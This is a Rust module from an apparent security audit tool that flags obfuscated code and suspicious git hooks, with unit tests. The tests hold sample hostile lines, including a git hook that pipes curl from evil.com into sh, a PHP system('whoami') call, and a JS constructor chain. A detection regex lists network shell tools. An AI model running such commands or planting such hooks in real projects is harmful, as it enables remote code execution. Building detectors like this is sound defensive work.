use crate::event::{AuditFinding, Severity};
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::Path;

use super::{is_language, DANGEROUS_FUNCS};

// --- Lazy-compiled regex patterns ---

static RE_HEX_ESCAPE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(\\x[0-9a-fA-F]{2}){3,}").unwrap());

static RE_UNICODE_ESCAPE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(\\u[0-9a-fA-F]{4}){3,}|(\\u\{[0-9a-fA-F]+\}){3,}").unwrap());

static RE_STRING_CONCAT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"['"][a-zA-Z_]{1,10}['"]\s*[+.]\s*['"][a-zA-Z_]{1,10}['"]"#).unwrap()
});

static RE_CHARCODE_JS: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"String\.fromCharCode\s*\([\d,\s]+\)").unwrap());

static RE_CHARCODE_PHP: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"chr\(\d+\)\s*\.\s*chr\(\d+\)").unwrap());

static RE_BRACKET_NOTATION: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\w+\[\s*['"][a-zA-Z]+['"]\s*\+\s*['"][a-zA-Z]+['"]\s*\]"#).unwrap()
});

static RE_CONSTRUCTOR_CHAIN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\.constructor\s*(\.\s*constructor\s*)+\(").unwrap());

static RE_PHP_VAR_FUNC: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$\w+\s*=\s*['"](\w+)['"]"#).unwrap()
});

static RE_GIT_HOOK_SUSPICIOUS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(curl\s|wget\s|eval\s|base64|/bin/sh|/bin/bash|\|\s*sh|\|\s*bash|python\s+-c|node\s+-e|nc\s+-|ncat\s|mkfifo)").unwrap()
});

/// Scan a single line for Tier 1 encoding/string manipulation patterns.
pub fn scan_line(
    line: &str,
    line_number: usize,
    file_path: &str,
    path: &Path,
    findings: &mut Vec<AuditFinding>,
) {
    // Rule 1: Hex escape sequences (skip .c/.h/.cpp where hex is common)
    if !is_language(path, &["c", "h", "cpp", "hpp"]) && RE_HEX_ESCAPE.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-hex-escape".to_string(),
            severity: Severity::Medium,
            description: "Suspicious hex escape sequence chain".to_string(),
            matched_pattern: "hex escape chain".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }

    // Rule 2: Unicode escape sequences (skip .json where unicode escapes are normal)
    if !is_language(path, &["json"]) && RE_UNICODE_ESCAPE.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-unicode-escape".to_string(),
            severity: Severity::Medium,
            description: "Suspicious unicode escape sequence chain".to_string(),
            matched_pattern: "unicode escape chain".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }

    // Rule 3: String concatenation hiding dangerous function names
    if RE_STRING_CONCAT.is_match(line) {
        let reconstructed = reconstruct_concat(line);
        let lower = reconstructed.to_lowercase();
        if DANGEROUS_FUNCS.iter().any(|f| lower.contains(f)) {
            findings.push(AuditFinding {
                file_path: file_path.to_string(),
                line_number: Some(line_number),
                rule_id: "obfuscation-string-concat".to_string(),
                severity: Severity::High,
                description: format!(
                    "String concatenation hiding dangerous function: {}",
                    reconstructed
                ),
                matched_pattern: "string concat obfuscation".to_string(),
                context_lines: vec![truncate_line(line)],
            });
        }
    }

    // Rule 4: Char code construction (JS and PHP)
    if RE_CHARCODE_JS.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-charcode".to_string(),
            severity: Severity::High,
            description: "String.fromCharCode() — possible code construction".to_string(),
            matched_pattern: "charcode construction".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }
    if is_language(path, &["php"]) && RE_CHARCODE_PHP.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-charcode".to_string(),
            severity: Severity::High,
            description: "PHP chr() concatenation — possible code construction".to_string(),
            matched_pattern: "charcode construction".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }

    // Rule 5: Bracket notation hiding dangerous function names
    if RE_BRACKET_NOTATION.is_match(line) {
        let reconstructed = reconstruct_bracket(line);
        let lower = reconstructed.to_lowercase();
        if DANGEROUS_FUNCS.iter().any(|f| lower.contains(f)) {
            findings.push(AuditFinding {
                file_path: file_path.to_string(),
                line_number: Some(line_number),
                rule_id: "obfuscation-bracket-notation".to_string(),
                severity: Severity::High,
                description: format!(
                    "Bracket notation hiding dangerous function: {}",
                    reconstructed
                ),
                matched_pattern: "bracket notation obfuscation".to_string(),
                context_lines: vec![truncate_line(line)],
            });
        }
    }

    // Rule 6: Constructor chain — almost exclusively malicious
    if RE_CONSTRUCTOR_CHAIN.is_match(line) {
        findings.push(AuditFinding {
            file_path: file_path.to_string(),
            line_number: Some(line_number),
            rule_id: "obfuscation-constructor-chain".to_string(),
            severity: Severity::Critical,
            description: "Constructor chain detected — common in JS exploits".to_string(),
            matched_pattern: "constructor chain".to_string(),
            context_lines: vec![truncate_line(line)],
        });
    }

    // Rule 8: PHP variable function calls
    if is_language(path, &["php"]) {
        if let Some(caps) = RE_PHP_VAR_FUNC.captures(line) {
            if let Some(func_name) = caps.get(1) {
                let lower = func_name.as_str().to_lowercase();
                if DANGEROUS_FUNCS.iter().any(|f| lower == *f) {
                    findings.push(AuditFinding {
                        file_path: file_path.to_string(),
                        line_number: Some(line_number),
                        rule_id: "obfuscation-php-variable-function".to_string(),
                        severity: Severity::High,
                        description: format!(
                            "PHP variable function hiding '{}' call",
                            func_name.as_str()
                        ),
                        matched_pattern: "php variable function".to_string(),
                        context_lines: vec![truncate_line(line)],
                    });
                }
            }
        }
    }
}

/// Rule 7: Scan .git/hooks/ directory for suspicious content.
pub fn scan_git_hooks(target: &Path) -> Vec<AuditFinding> {
    let mut findings = Vec::new();
    let hooks_dir = target.join(".git").join("hooks");

    if !hooks_dir.is_dir() {
        return findings;
    }

    let entries = match std::fs::read_dir(&hooks_dir) {
        Ok(e) => e,
        Err(_) => return findings,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        // Skip .sample files that come with git init
        if path.extension().and_then(|e| e.to_str()) == Some("sample") {
            continue;
        }

        let content = match std::fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        let file_path_str = path.to_string_lossy().to_string();

        for (i, line) in content.lines().enumerate() {
            if RE_GIT_HOOK_SUSPICIOUS.is_match(line) {
                findings.push(AuditFinding {
                    file_path: file_path_str.clone(),
                    line_number: Some(i + 1),
                    rule_id: "obfuscation-git-hook-injection".to_string(),
                    severity: Severity::Critical,
                    description: "Suspicious content in git hook".to_string(),
                    matched_pattern: "git hook injection".to_string(),
                    context_lines: vec![truncate_line(line)],
                });
            }
        }
    }

    findings
}

/// Reconstruct concatenated string fragments: 'ev' + 'al' -> eval
fn reconstruct_concat(line: &str) -> String {
    static RE_FRAGMENTS: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"['"]([a-zA-Z_]+)['"]"#).unwrap());

    let mut result = String::new();
    for cap in RE_FRAGMENTS.captures_iter(line) {
        if let Some(m) = cap.get(1) {
            result.push_str(m.as_str());
        }
    }
    result
}

/// Reconstruct bracket notation: window['ev' + 'al'] -> eval
fn reconstruct_bracket(line: &str) -> String {
    static RE_BRACKET_PARTS: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"\[\s*['"](\w+)['"]\s*\+\s*['"](\w+)['"]\s*\]"#).unwrap());

    let mut result = String::new();
    for cap in RE_BRACKET_PARTS.captures_iter(line) {
        if let (Some(a), Some(b)) = (cap.get(1), cap.get(2)) {
            result.push_str(a.as_str());
            result.push_str(b.as_str());
        }
    }
    result
}

fn truncate_line(line: &str) -> String {
    if line.len() > 120 {
        format!("{}...", &line[..120])
    } else {
        line.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_hex_escape_detection() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"const x = "\x63\x75\x72\x6c""#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-hex-escape"));
    }

    #[test]
    fn test_hex_escape_skip_c_files() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.c");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"char buf[] = "\x00\x01\x02\x03";"#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(!findings.iter().any(|f| f.rule_id == "obfuscation-hex-escape"));
    }

    #[test]
    fn test_unicode_escape_detection() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"const x = "\u0065\u0076\u0061\u006C""#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-unicode-escape"));
    }

    #[test]
    fn test_string_concat_eval() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"window['ev' + 'al']('code');"#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-string-concat"
            || f.rule_id == "obfuscation-bracket-notation"));
    }

    #[test]
    fn test_charcode_detection() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "var x = String.fromCharCode(101, 118, 97, 108);").unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-charcode"));
    }

    #[test]
    fn test_constructor_chain() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"[].constructor.constructor("return this")()"#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-constructor-chain"));
    }

    #[test]
    fn test_php_variable_function() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.php");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, r#"$fn = 'system'; $fn('whoami');"#).unwrap();

        let mut findings = Vec::new();
        let content = std::fs::read_to_string(&path).unwrap();
        for (i, line) in content.lines().enumerate() {
            scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
        }
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-php-variable-function"));
    }

    #[test]
    fn test_git_hook_detection() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".git").join("hooks");
        std::fs::create_dir_all(&hooks_dir).unwrap();

        let hook_path = hooks_dir.join("post-checkout");
        let mut f = std::fs::File::create(&hook_path).unwrap();
        writeln!(f, "#!/bin/sh").unwrap();
        writeln!(f, "curl http://evil.com/payload.sh | sh").unwrap();

        let findings = scan_git_hooks(dir.path());
        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-git-hook-injection"));
    }

    #[test]
    fn test_git_hook_sample_ignored() {
        let dir = tempfile::tempdir().unwrap();
        let hooks_dir = dir.path().join(".git").join("hooks");
        std::fs::create_dir_all(&hooks_dir).unwrap();

        let hook_path = hooks_dir.join("pre-commit.sample");
        let mut f = std::fs::File::create(&hook_path).unwrap();
        writeln!(f, "#!/bin/sh").unwrap();
        writeln!(f, "exec git diff-index --check --cached HEAD --").unwrap();

        let findings = scan_git_hooks(dir.path());
        assert!(findings.is_empty());
    }
}
